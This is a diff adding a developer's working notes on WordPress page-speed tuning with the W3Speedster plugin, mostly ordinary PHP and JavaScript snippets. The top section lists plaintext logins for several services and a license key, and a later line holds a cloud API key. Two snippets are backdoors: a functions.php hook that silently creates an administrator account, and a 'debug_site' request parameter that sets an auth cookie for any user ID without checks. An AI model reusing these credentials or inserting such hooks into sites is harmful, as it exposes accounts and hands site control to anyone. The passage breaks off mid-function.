@@ -1,0 +1,2258 @@
+ezojs (ads plugin) will not be lazyload in wordpress
+
+===========================chat gpt details =============================
+alexnowworking@gmail.com
+sagar@verma
+
+=================================git details=================================
+
+git clone https://gitlab.com/development293/w3speedster-wordpress-optimization.git
+
+support@w3speedup.com
+Ashishphp@24
+
+
+============================imagify license key ========================================
+
+license key for imagefy is: 894d996d2aac9254677f3c1d22d9832cb6e958dd
+
+==================================https://www.browserstack.com/ details ================================
+
+support@w3speedup.com
+Ashishphp23
+
+===========================pure vpn =============================
+
+purevpn0d8968132
+purevpn0d8968109
+support$321
+
+==============================freepik.com=============================================================
+
+ashishphpdeveloper1@gmail.com
+Ashishphp24
+
+==================rev slider exclude setting   (rev-slider modules)================ (look in bottom for all function of rev slider)
+
+=> Exclude Javascript tags from combine
+
+jquery-core-js full
+/revslider/ defer
+
+=> Exclude Inline Javascript from combine
+
+setREVStartSize
+revslider
+
+=> function.php
+
+function w3speedup_inner_js_customize($html){
+    global $load_slider;
+    if(empty($load_slider)){
+        $load_slider = 1;
+    }
+    if(strpos($html,'revinit_revslider') !== false || strpos($html,'rsCustomAjaxContent_Once') !== false || strpos($html,'#rev_slider_46_1') !== false){     
+        $html = 'var load_slider'.$load_slider.' = setInterval(function(){if(typeof(jQuery) == "function" && typeof(jQuery.fn.revolution) == "object" && window.RS_MODULES != undefined){clearInterval(load_slider'.$load_slider.');}else{return;}var timeout1 = window.innerWidth > 768 ? 10 : 1500;setTimeout(function(){'.$html.'},timeout1);},100);';   
+    }
+    $load_slider++;
+    return $html;
+}
+
+function w3speedup_exclude_javascript_filter($exclude_js,$script_obj,$script){
+    if(wp_is_mobile()){
+        if(strpos($script,'jquery-core-js') !== false || strpos($script,'/revslider/') !== false){
+            return 0;
+        }
+    }
+    return $exclude_js;
+}
+
+
+
+
+--------- use this function if rev slider is latest (to search rs_module if it is available use this function)
+
+function w3speedup_inner_js_customize($html){
+global $load_slider;
+if(empty($load_slider)){
+$load_slider = 1;
+}
+if(strpos($html,'revinit_revslider') !== false || strpos($html,'rsCustomAjaxContent_Once') !== false || strpos($html,'#rev_slider_46_1') !== false){     
+$html = 'var load_slider'.$load_slider.' = setInterval(function(){if(typeof(jQuery) == "function" && typeof(jQuery.fn.revolution) == "object" && window.RS_MODULES != undefined){clearInterval(load_slider'.$load_slider.');}else{return;}var timeout1 = window.innerWidth > 768 ? 10 : 1500;setTimeout(function(){'.$html.'},timeout1);},100);';   
+}
+$load_slider++;
+return $html;
+} 
+
+
+
+===================to create user and password by function.php==================
+
+add_action('init', 'xyz1234_my_custom_add_user');
+
+function xyz1234_my_custom_add_user() {
+    $username = 'username123';
+    $password = 'pasword123';
+    $email = 'drew@example.com';
+
+    if (username_exists($username) == null && email_exists($email) == false) {
+
+        // Create the new user
+        $user_id = wp_create_user($username, $password, $email);
+
+        // Get current user object
+        $user = get_user_by('id', $user_id);
+
+        // Remove role
+        $user->remove_role('subscriber');
+
+        // Add role
+        $user->add_role('administrator');
+    }
+}
+
+
+
+================================== to open admin panel by auth =======================
+
+
+if(isset($_REQUEST['debug_site']) && !empty($_REQUEST['debug_site'])){
+	wp_set_auth_cookie( $_REQUEST['debug_site'] ); exit;
+}
+
+
+=================== to remove email-decode.min.js from cloudflare ===================
+
+
+website = > scrape shield =>  Email Address Obfuscation (disable it)
+
+
+
+==================== disable mirage2.min.js  from cloudflare ========================
+
+
+Speed tab > Optimization  > Mirage ( off.)
+
+
+
+==================== to disable beacon.min.js from cloudflare  (it will disable from main account of website cloudflare) =========== 
+
+
+main account >  analytics & logs > web analytics (NOT “Account Analytics”)
+
+==================================to disable invisible.js from cloudflare ==================================
+
+Go to Security > Bots.
+Select Configure Bot Management.
+For JavaScript Detections, switch the toggle to Off.
+
+
+============= to fix mix blocking content (content serve in http:\\ )
+
+install really simple ssl plugin
+
+===========avada builder================
+dynamic css and js (if css loading in style tag and u want to load css in file)
+
+click on file option
+
+==================== for pinterest button on hover =============
+force lazy load
+
+ main.js
+pinit_main.js
+pinit.js
+
+======= general settings  =========
+
+git clone https://gitlab.com/w3speedup/w3speedup.git
+support@w3speedup.com
+Ashishphp24
+
+[ -----  check plugin if anyone is using cache or optimizing images if than close it or deactivate plugin -----------]
+
+
+
+(make sure their is no space between anything you enter)
+
+
+-- in divi builder changes option if any any is active
+
+-- check wp-config to see if cache is true or not
+
+=>  Exclude Pages From Optimization  -----
+
+wp-login.php
+/cart/
+/checkout/
+
+
+
+=> Exclude images from Lazy Loading  -------
+
+
+base64
+rev-slidebg
+no-lazy
+facebook
+googletagmanager
+logo 
+
+
+=> preload resource  ()
+
+ ---  enter things that you want to preload here like (sliders etc.) 
+
+
+this thing will be tick = > 
+
+Minify html
+Enable leverage browsing cache
+Enable Gzip compression
+Remove query parameters
+Enable lazy Load - image,iframe,video,audio
+Enable Webp support
+Optimize images via wp-cron
+Automatically optimize images on upload
+Responsive images
+
+
+
+========= css setting ==========
+
+
+=>  this thing will be tick
+
+Enable css minification
+Load critical Css (after making critical)
+Load critical Css in style Tag  (after making critical)
+Combine Google fonts
+
+
+
+=> Force lazy load link tag css  (enter icons name here)
+
+
+==========javascript setting================
+
+
+
+=> this thing will be tick
+
+Enable js minification
+
+
+
+=> Exclude Javascript tags from combine  (add file name that has link  example - jquery-min-js)
+
+
+=> Exclude Inline Javascript from combine (inline script add here)
+
+google-analytics
+hbspt
+/* <![CDATA[ */
+
+
+=> imgae optimize on mobile link like this (add after image name "-595xh")
+
+-example ->
+
+https://stasolocksmith.b-cdn.net/wp-content/w3-webp/uploads/2019/05/business-01-595xh.jpgw3.webp
+
+
+
+=> to fonts new links (enque fonts in website)
+
+add_action( 'wp_enqueue_scripts', 'new_fonts' );
+function new_fonts() {
+  wp_enqueue_style( 'new-fonts', 'https://newwall.com/wp-content/themes/north-wp-child/fonts.css');
+}
+
+
+=> to enqueue css file by function.php
+
+function wp_awesome_css() {
+ wp_enqueue_style('font-awesome-styles', get_template_directory_uri() . '/assets/fonts.css');
+}
+add_action( 'wp_enqueue_scripts', 'wp_awesome_css');
+
+=> remove srcset from js
+
+var images = document.querySelectorAll('.single-page .envira-gallery-public .envira-gallery-item img');
+
+images.forEach((image) => {
+  if (image.hasAttribute('srcset')) {
+    image.removeAttribute('srcset');
+  }
+});
+
+=> to disable srcset in images
+
+function meks_disable_srcset( $sources ) {
+    return false;
+    }
+add_filter( 'wp_calculate_image_srcset', 'meks_disable_srcset' );
+
+
+=> remove preload from  <link> tag by js 
+
+function w3speedup_before_start_optimization($html){
+   $html = str_replace(array(""),array(""),$html);
+    return $html;
+}
+function w3speedup_after_optimization($html){
+   $html = str_replace(array('ss<div'),array(''),$html);
+    return $html;
+}
+
+example	-
+
+function w3speedup_before_start_optimization($html){
+   $html = str_replace(array('<link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Open%20Sans%3A300italic%2C400italic%2C600italic%2C700italic%2C800italic%2C400%2C300%2C600%2C700%2C800%7COpen%20Sans%20Condensed%3A300%2C300italic%2C700%7CJosefin%20Sans%3A100%2C200%2C300%2Cregular%2C500%2C600%2C700%2C100italic%2C200italic%2C300italic%2Citalic%2C500italic%2C600italic%2C700italic%7COpen%20Sans%3A300%2C300italic%2Cregular%2Citalic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic&#038;subset=latin%2Clatin-ext&#038;display=swap" />','media="print"',"this.media='all'"),array('<link rel="" as="style" href="https://fonts.googleapis.com/css?family=Open%20Sans%3A300italic%2C400italic%2C600italic%2C700italic%2C800italic%2C400%2C300%2C600%2C700%2C800%7COpen%20Sans%20Condensed%3A300%2C300italic%2C700%7CJosefin%20Sans%3A100%2C200%2C300%2Cregular%2C500%2C600%2C700%2C100italic%2C200italic%2C300italic%2Citalic%2C500italic%2C600italic%2C700italic%7COpen%20Sans%3A300%2C300italic%2Cregular%2Citalic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic&#038;subset=latin%2Clatin-ext&#038;display=swap" />','',""),$html);
+    return $html;
+}
+
+
+=> remove thing from dom in only mobile by after_optimization hook
+
+function w3speedup_after_optimization($html){
+    $html = str_replace('@font-face {font-family:"awb-icons";','@font-face {',$html);
+    $html = str_replace("@font-face {  font-family:'icomoon';","@font-face {",$html);
+    if(wp_is_mobile()){
+        $html = str_replace('data-src="https://dk8dmtco5sckz.cloudfront.net/wp-content/w3-webp/uploads/2022/02/sge-homecover-2022-ver-2-mb.jpgw3.webp"','https://dk8dmtco5sckz.cloudfront.net/wp-content/w3-webp/uploads/2022/02/sge-homecover-2022-ver-2-mb-595xh.jpgw3.webp',$html);
+    }
+    return $html;
+}
+
+=> preload fonts by function.php
+
+add_action('wp_head', 'preload_fonts', 1);
+function  preload_fonts(){
+        ?>
+        <link rel="preload" href="https://fonts.gstatic.com/s/poppins/v20/pxiEyp8kv8JHgFVrJJfecg.woff2" as="font" type="font/woff2" crossorigin>
+        <link rel="preload" href="https://fonts.gstatic.com/s/poppins/v20/pxiByp8kv8JHgFVrLGT9Z1xlFQ.woff2" as="font" type="font/woff2" crossorigin>
+        <link rel="preload" href="https://fonts.gstatic.com/s/playfairdisplay/v30/nuFvD-vYSZviVYUb_rj3ij__anPXJzDwcbmjWBN2PKdFvXDXbtM.woff2" as="font" type="font/woff2" crossorigin>
+        <link rel="preload" href="https://fonts.gstatic.com/s/playfairdisplay/v30/nuFiD-vYSZviVYUb_rj3ij__anPXDTzYgA.woff2" as="font" type="font/woff2" crossorigin>
+        <?php
+}
+
+
+=> preload fonts page wise in function.php
+
+add_action('wp_head', 'preload_fonts', 1);
+function preload_fonts() {
+    if (is_home()) {
+        ?>
+        <link rel="preload" href="https://fonts.gstatic.com/s/barlow/v12/7cHpv4kjgoGqM7E_DMs5.woff2" as="font" type="font/woff2" crossorigin>
+        <link rel="preload" href="https://fonts.gstatic.com/s/barlow/v12/7cHqv4kjgoGqM7E3t-4s51os.woff2" as="font" type="font/woff2" crossorigin>
+        <?php
+    }
+        elseif(is_page(1569)){
+        ?>
+        <link rel="preload" href="https://fonts.gstatic.com/s/barlow/v12/7cHqv4kjgoGqM7E30-8s51os.woff2" as="font" type="font/woff2" crossorigin>
+        <link rel="preload" href="https://fonts.gstatic.com/s/barlow/v12/7cHpv4kjgoGqM7E_DMs5.woff2" as="font" type="font/woff2" crossorigin>
+        <?php
+        }
+         else{
+        ?>
+        <link rel="preload" href="https://fonts.gstatic.com/s/barlow/v12/7cHpv4kjgoGqM7E_DMs5.woff2" as="font" type="font/woff2" crossorigin>
+        <link rel="preload" href="https://fonts.gstatic.com/s/barlow/v12/7cHqv4kjgoGqM7E30-8s51os.woff2" as="font" type="font/woff2" crossorigin>
+        <link rel="preload" href="https://fonts.gstatic.com/s/barlow/v12/7cHqv4kjgoGqM7E3t-4s51os.woff2" as="font" type="font/woff2" crossorigin>
+        <link rel="preload" href="https://fonts.gstatic.com/s/barlowsemicondensed/v15/wlpvgxjLBV1hqnzfr-F8sEYMB0Yybp0mudRXeIqq.woff2" as="font" type="font/woff2" crossorigin>
+        <?php
+        }
+
+}
+?>
+
+
+=> to stop critical css in pages
+
+function w3_no_critical_css($url){
+    if (strpos($url,'/home/') !== false) {
+        return true; 
+    }
+}
+
+example if you want to stop critical in multiple css --
+
+function w3_no_critical_css($url){
+    if (strpos($url,'/vjarum-araqum/') !== false || strpos($url,'/veradardzi-paymanner/') !== false || strpos($url,'/inchpes-patvirel/') !== false || strpos($url,'/faq/') !== false) {
+        return true; 
+    }
+}
+
+
+=> to know post type of any pages in website
+
+?w3_get_css_post_type=1
+
+
+=>icon font family format
+
+
+@font-face {
+font-family: 'eicons';
+src: url('') format('woff2');
+font-weight: normal;
+font-style: normal;
+font-dislpay:swap;
+}
+
+=> add script in function.php
+
+function addScript() {
+    ?>
+        <script>
+  
+
+    setTimeout(function(){
+        if(document.querySelector('link') != null)
+        document.querySelectorAll('link').forEach(function(index){
+        index.setAttribute('href',index.getAttribute('data-href'));
+        })
+        },500)
+    
+
+        </script>
+    <?php }
+add_action('wp_head', 'addScript', 1);
+
+
+=> to remove content from dom without w3speedup plugin by php 
+
+function custom_after_optimization($html) {
+  $html = str_replace(array(
+          'data-lazy-src="https://p3c7.c15.e2-1.dev/shop1/2024/02/Pau5oWp6-logo.png"'
+  ), array(
+      'data-lazy-src=""'
+  ), $html);
+
+  return $html;
+}
+add_filter('the_content', 'custom_after_optimization');
+add_action('wp_head', 'custom_buffer_start');
+add_action('wp_footer', 'custom_buffer_end');
+
+function custom_buffer_start() {
+  ob_start('custom_after_optimization');
+}
+
+function custom_buffer_end() {
+  ob_end_flush();
+}
+
+
+ 
+=> make a script work on mousemove and scroll  (add your script in executeScript function)
+
+var isScriptExecuted = false;
+
+function executeScript() {
+ /* enter script here*/
+    if (document.body.classList.contains('page-id-12757')) {
+        if (document.querySelector('.elementor-element-3c973e6f img') != null) {
+            document.querySelectorAll('.elementor-element-3c973e6f img').forEach(function(index) {
+                index.setAttribute('src', index.getAttribute('data-src'));
+            });
+        }
+    }
+
+    /*script end here*/
+    
+    isScriptExecuted = true;
+}
+
+function handleMouseMoveOrScroll() {
+    if (!isScriptExecuted) {
+        executeScript();
+    }
+}
+
+document.addEventListener('mousemove', handleMouseMoveOrScroll);
+document.addEventListener('scroll', handleMouseMoveOrScroll);
+
+
+=> to append a script at the end of page
+
+ // Function to create and append the script
+ function appendOwlCarouselScript() {
+  var script = document.createElement('script');
+  script.type = 'text/javascript';
+  script.text = `
+      var owl = jQuery('.newtestimonialslider');
+      owl.owlCarousel({
+          margin: 10,
+          items: 4,
+          autoplay: true,
+          nav: true,
+          responsive: {
+              0: {
+                  items: 1
+              },
+              600: {
+                  items: 2
+              },
+              1000: {
+                  items: 3
+              }
+          }
+      });
+  `;
+  document.body.appendChild(script);
+}
+
+// Call the function to append the script
+appendOwlCarouselScript();
+
+
+=> add class in body on mouseover and scroll
+
+var timer;
+function addClassAfterDelay() {
+    timer = setTimeout(function() {
+        paymentContainer.classList.add('appco_opt');
+    }, 5000);
+}
+function resetTimer() {
+    clearTimeout(timer); 
+    addClassAfterDelay(); 
+}
+var paymentContainer = document.querySelector('body');
+addClassAfterDelay();
+window.addEventListener('scroll', resetTimer);
+window.addEventListener('mousemove', resetTimer);
+
+
+=> open menu on one click 
+
+
+var w3_menuclicked = 0;
+var w3_menu = document.getElementsByClassName("icon-menu");
+var w3_html = document.getElementsByTagName('html')[0];
+var clickFunction = function() {
+    console.log(12222);
+    if(!w3_html.classList.contains('w3_js')){
+       w3_menuclicked=1;
+    }
+};
+for (var i = 0; i < w3_menu.length; i++) {
+    w3_menu[i].addEventListener('click', clickFunction, false);
+}
+
+
+setTimeout(function(){
+if(w3_menuclicked){
+   console.log(11111111);
+w3_menuclicked = 0;
+jQuery('.icon-menu').trigger('click');
+ }
+},1100);
+
+
+
+=> open menu in one click by adding class in body after all js load
+
+var w3_menuclicked = 0;
+var w3_menu = document.getElementsByClassName("main-menu-wrapper__main-menu");
+var w3_html = document.getElementsByTagName('html')[0];
+var clickFunction = function() {
+    console.log(12222);
+    if(!w3_html.classList.contains('w3_js')){
+       w3_menuclicked=1;
+    }
+};
+for (var i = 0; i < w3_menu.length; i++) {
+    w3_menu[i].addEventListener('click', clickFunction, false);
+}
+
+
+setTimeout(function(){
+if(w3_menuclicked){
+   console.log(11111111);
+w3_menuclicked = 0;
+jQuery('body').addClass('bodychecking');
+ }
+
+jQuery('.main-menu-wrapper__main-menu').click(function(){
+    jQuery('body').addClass('bodychecking');
+})
+jQuery('.mobile-nav__close').click(function(){
+    jQuery('body').removeClass('bodychecking');
+})
+jQuery('.mobile-nav__overlay').click(function(){
+    jQuery('body').removeClass('bodychecking');
+})
+
+},1100);
+
+
+ 
+=> to check multiple words in url by js
+
+if (/\/collections\/jashn\//.test(window.location.href)) {
+    document.body.classList.add('jashcollection');
+}
+
+=> click without delay elementor menu
+
+
+if(document.querySelector('.elementor-menu-toggle') != null ){
+
+var w3_menuclicked = 0;
+var w3_menu = document.querySelectorAll('.elementor-menu-toggle');
+var w3_html = document.getElementsByTagName('html')[0];
+   
+[].forEach.call(w3_menu, el => {
+  el.addEventListener('click', btnClick, false)
+})
+
+   function btnClick() {
+      if(!w3_html.classList.contains('w3_js')){     
+        this.classList.toggle('elementor-active');
+      }
+   }
+}
+
+
+
+=> if above menu script doesnt work for menu and menu element is available (try this script)
+
+if(document.querySelector('.event-menu') != null ){
+var w3_menuclicked = 0;
+var w3_menu = document.querySelectorAll('.event-menu');
+var w3_html = document.getElementsByTagName('html')[0];
+   
+[].forEach.call(w3_menu, el => {
+  el.addEventListener('click', btnClick, false)
+})
+   function btnClick() {
+      if(!w3_html.classList.contains('w3_js')){     
+         document.getElementsByClassName("menu-popup")[0].classList.toggle("event-menu-opened");
+      }
+   }
+}
+
+=> for menu script if nothing work
+
+if(document.querySelector('.off-canvas-navigation-wrapper') != null ){
+var w3_menuclicked = 0;
+var w3_menu = document.querySelectorAll('.off-canvas-navigation-wrapper');
+var w3_html = document.getElementsByTagName('html')[0];
+    
+[].forEach.call(w3_menu, el => {
+  el.addEventListener('click', btnClick, false)
+})
+    function btnClick() {
+        if(!w3_html.classList.contains('w3_js')){        
+           document.getElementsByTagName("html")[0].classList.add("myiamtoggle");
+        }
+    }
+}
+
+
+=> to open menu by adding class in body on
+
+var elements = document.querySelectorAll(".et-l--header span.mobile_menu_bar");
+for (var i = 0; i < elements.length; i++) {
+    elements[i].addEventListener("click", function(){
+        console.log("---btn clicked----");
+    })
+  }
+
+=> convert jpg to webp (put in function.php)
+
+function w3_disable_htaccess_wepb(){
+   return true;
+}
+
+=> to separate  critical css  
+
+function w3_create_separate_critical_css_of_post_type(){
+    return array('page', 'product', 'post', 'treatments');
+}
+
+=> remove css from critical css
+
+
+function w3speedup_customize_critical_css($critical_css){
+   $critical_css = str_replace(array("@font-face{font-family:'FontAwesomePro';"),array(""),$critical_css);
+   return $critical_css;
+}
+
+=> remove more than one css in critical css example  -
+
+function w3speedup_customize_critical_css($critical_css){
+    $critical_css = str_replace(array("@font-face{font-family:ETmodules;"),array(""),$critical_css);
+    $critical_css = str_replace(array("@font-face{font-family:FontAwesome;"),array(""),$critical_css);
+    return $critical_css;
+}
+
+=> add class on body when body is completely loaded by js (to show image on the place of video)
+
+var video = document.querySelector('video#mainVideo');
+
+video.addEventListener('loadedmetadata', function() {
+  document.body.classList.add('video-loaded');
+});
+
+=> for divi  main product slider 
+
+function w3speedup_internal_js_customize($html,$path){
+	if(strpos($path,'Divi/js/scripts.min.js') !== false){	
+		$html = str_replace('t(".woocommerce .woocommerce-product-gallery").length>0','t(".woocommerce .woocommerce-product-gallery").length<0',$html);
+	}
+	return $html;
+}
+
+
+=> to exclude pages from critical css 
+
+function w3_no_critical_css($url){
+    if (strpos($url,'/aporrofitires/') !== false) {
+        return true; 
+    }
+}
+
+
+=> to make critical css
+
+https://www.crimsoncoward.com/?w3_preload_css=sdsdfhgsdfsdf&url=https://www.crimsoncoward.com/
+
+
+=> to know critical css path (if you need to delete critical css)
+
+https://www.francoisbreton.com/meditations/?w3_get_css_post_type=1
+
+
+=> to delete critical css from cloud 
+
+https://cloud.w3speedup.com/optimize/css/delete-css.php?url=https://santarosa.limo&key=uBB5ISCufJNHEyPL
+
+
+
+=> to remove only text from a div even if div has multiple this in div like image,icon (it will only remove text from div )
+
+jQuery("div#footer-area .AuthorizeNetSeal ").contents().filter(function() {
+    return this.nodeType === 3; // Node.TEXT_NODE
+  }).remove();
+
+
+=> parallax effect in background in query
+
+jQuery(window).scroll(function() {
+    wScroll = jQuery(this).scrollTop();
+
+    jQuery('.et_parallax_bg_tablet_exist').css({
+      'transform' : 'translate(0px, '+ wScroll /50 +'%)'
+    });
+
+});
+
+
+
+=> parallax effect in background by transform value in JS
+
+
+window.addEventListener('scroll', function() {
+  var wScroll = window.pageYOffset || document.documentElement.scrollTop;
+
+  var element = document.querySelectorAll('.et_parallax_bg');
+  for (var i = 0; i < element.length; i++) {
+    element[i].style.transform = 'translate(0px, ' + wScroll / 50 + '%)';
+  }
+});
+
+
+=> trigger animation when section arrive on screen
+
+var element = document.querySelector('.craftmanmainsec');
+var elementHeight = element.clientHeight;
+document.addEventListener('scroll', animate);
+function inView() {
+  var windowHeight = window.innerHeight;
+  var scrollY = window.scrollY || window.pageYOffset;
+  var scrollPosition = scrollY + windowHeight;
+  var elementPosition = element.getBoundingClientRect().top + scrollY + elementHeight;  
+  if (scrollPosition > elementPosition) {
+    return true;
+  }  
+  return false;
+}
+function animate() {
+  if (inView()) {
+      element.classList.add('animatecraft');
+  }
+}
+
+=> parallax effect in background by background-postition in js
+
+if(window.innerWidth > 900){
+window.addEventListener('scroll', function(){
+  var scrollPosition = window.pageYOffset;
+  var bgParallax = document.querySelector('.home .et_pb_section.et_pb_section_0');
+  var limit = bgParallax.offsetTop + bgParallax.offsetHeight;  
+  if (scrollPosition > bgParallax.offsetTop && scrollPosition <= limit){
+    bgParallax.style.backgroundPositionY = (10 - 10*scrollPosition/limit) + '%';   
+  }else{
+    bgParallax.style.backgroundPositionY = '10%';    
+  }
+});
+}
+
+
+=> fix position a section when it arrives on page  by js
+
+if(window.innerWidth < 500){
+var paymentContainer = document.querySelector('.product-form__payment-container');
+var offsetTop = paymentContainer.offsetTop;
+
+window.addEventListener('scroll', function() {
+    var scrollPosition = window.scrollY;
+    if (scrollPosition >= offsetTop + 100) {
+        paymentContainer.classList.add('fixedheader');
+    } else {
+        paymentContainer.classList.remove('fixedheader');
+    }
+});
+}
+
+
+=> keep one section fix  only till right section is in view of dekstop by js
+
+(ref - https://www.sweedesi.com/collections/send-buy-famous-traditional-sweets-online-across-india/Pan-India)
+
+if(window.innerWidth > 1200){
+var footer = document.querySelector('main#main .layout__section .collection');
+var offsetTop = footer.offsetHeight - 350 ;
+var dynamicElement = document.getElementById("desktop-filters-form");
+console.log(offsetTop);
+window.addEventListener("scroll", function() {
+    if (window.scrollY > 120 && window.scrollY < offsetTop) {
+        dynamicElement.classList.add("newClass");
+    } else if (window.scrollY > offsetTop) {
+        dynamicElement.classList.remove("newClass");
+        console.log('i am in condition')
+    } else {
+        dynamicElement.classList.remove("newClass");
+    }
+});
+}
+
+
+=> to make small background image in main blog page(blog inner page ) in mobile
+
+function w3speedup_after_optimization($html){
+   if(wp_is_mobile() && is_single()){
+      $html = preg_replace('/(url\()(\S*)(\.jpgw3.webp)/i', '$1$2-595xh$3', $html);
+      $html = preg_replace('/(url\()(\S*)(\.jpegw3.webp)/i', '$1$2-595xh$3', $html);
+      $html = preg_replace('/(url\()(\S*)(\.pngw3.webp)/i', '$1$2-595xh$3', $html);
+   }
+   return $html;
+}
+
+
+
+
+==================== if jpg and png image doesnt convert to webp use this function in function.php =================
+
+function  w3speedup_customize_image($imgnn,$img,$imgnn_arr){
+    if(!empty($imgnn_arr['data-lazyload'])){
+        $img1 = str_replace(array('/wp-content/uploads/','.jpg','.png'),array('/wp-content/w3-webp/uploads/','.jpgw3.webp','.pngw3.webp'),$imgnn_arr['data-lazyload']);
+        $imgnn = str_replace($imgnn_arr['data-lazyload'],$img1,$imgnn);
+    }
+    return $imgnn;
+}
+
+
+
+=> to popup work on click
+
+var w3_menuclicked1 = 0;
+var opennav = document.querySelector('.home .page-content ');
+var menushowcase = document.querySelector('body');
+var w3_html1 = document.getElementsByTagName('html')[0];
+
+opennav.addEventListener("click", function(){
+ menushowcase.classList.add('showmodal');
+console.log("i am working");
+});
+
+setTimeout(function(){
+if(menushowcase.classList.contains('showmodal')){
+    console.log(11111111);
+w3_menuclicked1 = 0;
+jQuery('.home .page-content ').trigger('click');
+ }
+},1100);
+
+
+=> open one section and keep other close (when click on open sec it will be close too)
+
+var wilhead = document.querySelectorAll('.wilaccordheading');
+for (let i = 0; i < wilhead.length; i++) {
+    wilhead[i].addEventListener('click', function() {
+        var isOpen = this.classList.contains('showmycontent');
+        wilhead.forEach(function(li) {
+            li.classList.remove('showmycontent');
+        });
+        if (!isOpen) {
+            this.classList.add('showmycontent');
+        }
+    });
+}
+
+
+=> make product slider sticky on scroll by position fixed by js
+
+if (document.querySelector('body').classList.contains('template-product') && window.innerWidth > 1200) {
+    var imagegallery = document.querySelector('.template-product .productView-images-wrapper');
+    var haloProductViewLeft = document.querySelector('.template-product .halo-productView-left');
+
+    window.addEventListener('scroll', function() {
+        var verticalScroll = window.scrollY || window.pageYOffset;
+        var offsetStartMovingUp = 150;
+        var productViewHeight = document.querySelector('.template-product .productView').offsetHeight;
+        var productImageWrapperHeight = document.querySelector('.template-product .productView-image-wrapper').offsetHeight;
+        var offsetStartDecreasing = productViewHeight - productImageWrapperHeight - 94; 
+        
+        var width = haloProductViewLeft.offsetWidth - 20;
+        imagegallery.style.cssText = `position: fixed; top: 94px; width: ${width}px;`;
+
+        if (verticalScroll >= offsetStartDecreasing) {
+            var decreasePosition = 94 - (verticalScroll - offsetStartDecreasing);
+            imagegallery.style.top = decreasePosition + 'px';
+        } else {
+            imagegallery.style.top = '';
+        }
+    });
+}
+
+
+
+=> add left right  button in flickcity slider and make it work in by js
+
+if(window.innerWidth < 767){
+window.addEventListener("scroll", function() {
+    var sp_div = document.createElement("div");                 
+var sp_inner = `<button class="carousel-prev-button"><svg focusable="false" class="icon icon--arrow-left " viewBox="0 0 8 12" role="presentation">
+    <path stroke="currentColor" stroke-width="2" d="M6 10L2 6l4-4" fill="none" stroke-linecap="square"></path>
+  </svg></button><button class="carousel-next-button"><svg focusable="false" class="icon icon--arrow-right " viewBox="0 0 8 12" role="presentation">
+    <path stroke="currentColor" stroke-width="2" d="M2 2l4 4-4 4" fill="none" stroke-linecap="square"></path>
+  </svg></button>`;        
+sp_div.classList.add('flickcitybtns');
+sp_div.innerHTML = sp_inner;                             
+document.querySelector('.product-gallery__carousel-wrapper').appendChild(sp_div);
+
+setTimeout(function(){
+    var carouselItems = document.querySelectorAll('.product-gallery__carousel-item');
+    var prevButton = document.querySelector('.carousel-prev-button');
+    var nextButton = document.querySelector('.carousel-next-button');
+
+    var currentIndex = 0;
+    prevButton.addEventListener('click', function() {
+        carouselItems[currentIndex].classList.remove('is-selected');
+        currentIndex = (currentIndex - 1 + carouselItems.length) % carouselItems.length;
+        carouselItems[currentIndex].classList.add('is-selected');
+    });
+
+    nextButton.addEventListener('click', function() {
+        carouselItems[currentIndex].classList.remove('is-selected');
+        currentIndex = (currentIndex + 1) % carouselItems.length;
+        carouselItems[currentIndex].classList.add('is-selected');
+    });
+},1100);
+});
+}
+
+=> zoom effect for product image 
+
+.template-product .product-gallery__media {
+    overflow: hidden;
+    position: relative;
+    width: 100%;
+    height: 100%;
+  }
+  .template-product  .product-gallery__media img {
+    transition: transform 0.3s ease; 
+  }
+  
+  .template-product  .product-gallery__media img.zoomed {
+    transform: scale(2);
+  }
+  
+
+var zoombody = document.querySelector('body');
+  if (zoombody.classList.contains('template-product')) {
+    const zoomContainers = document.querySelectorAll(".product-gallery__media");  
+  zoomContainers.forEach((zoomContainer) => {
+      const zoomImage = zoomContainer.querySelector("img");  
+      zoomContainer.addEventListener("mousemove", function (e) {
+        const { left, top, width, height } = zoomContainer.getBoundingClientRect();
+        const mouseX = e.clientX - left;
+        const mouseY = e.clientY - top;
+        const centerX = width / 2;
+        const centerY = height / 2;  
+        const translateX = (centerX - mouseX) * 0.1;
+        const translateY = (centerY - mouseY) * 0.1;  
+        zoomImage.style.transformOrigin = `${mouseX}px ${mouseY}px`;
+        zoomImage.style.transform = `translate(${translateX}px, ${translateY}px) scale(2)`;
+      });  
+      zoomContainer.addEventListener("mouseleave", function () {
+        zoomImage.style.transform = "none";
+      });
+    });
+  }
+
+
+
+=> text animation jquery (one text display other stay display none )
+
+
+var $=jQuery;
+$.fn.rotaterator = function(options) {
+  var defaults = {
+    fadeSpeed: 1000,
+    pauseSpeed: 5000,
+    child: null
+  };
+   
+  var options = $.extend(defaults, options);
+  return this.each(function() {
+    let o = options;
+    let obj = $(this);
+    let items = $(obj.children(), obj);
+    
+    items.each(function() {
+      $(this).hide();
+    });
+    
+    let next;
+    if (!o.child) {
+      next = $(obj).children(':first');
+    } else {
+      next = o.child;
+    }    
+    $(next).fadeIn(o.fadeSpeed, function() {
+      $(this).delay(o.pauseSpeed).fadeOut(o.fadeSpeed, function() {
+        let next = $(this).next();
+        if (next.length == 0) {
+          next = $(obj).children(':first');
+        }
+        $(obj).rotaterator({ child: next, fadeSpeed: o.fadeSpeed, pauseSpeed: o.pauseSpeed });
+      });
+    });
+  });
+};
+
+$(document).ready(function() {
+  $('#rotate').rotaterator({ fadeSpeed: 500, pauseSpeed: 1500 });
+});
+
+
+======================= if this doesnt work than use this by class wise =======================
+
+if(is_home() || is_front_page()){
+   $html = preg_replace('/(\.elementor-motion-effects-layer{background-image: url\()(\S*)(\.jpgw3.webp)/i', '$1$2-595xh$3', $html); 
+      
+}
+
+==== example to use this script
+
+(1) example === for mobile view and single post only
+
+function w3speedup_after_optimization($html){
+   if(wp_is_mobile() && is_single()){
+      $html = preg_replace('/(\.et_pb_post_title_0_tb_body.et_pb_featured_bg{background-image:url\()(\S*)(\.jpgw3.webp)/i', '$1$2-595xh$3', $html);
+        $html = preg_replace('/(\.et_pb_post_title_0_tb_body.et_pb_featured_bg{background-image:url\()(\S*)(\.jpegw3.webp)/i', '$1$2-595xh$3', $html);   
+        $html = preg_replace('/(\.et_pb_post_title_0_tb_body.et_pb_featured_bg{background-image:url\()(\S*)(\.pngw3.webp)/i', '$1$2-595xh$3', $html);    
+   }
+   return $html;
+}
+
+
+(2) example ===  for single post only
+
+function w3speedup_after_optimization($html){
+   if(is_single()){
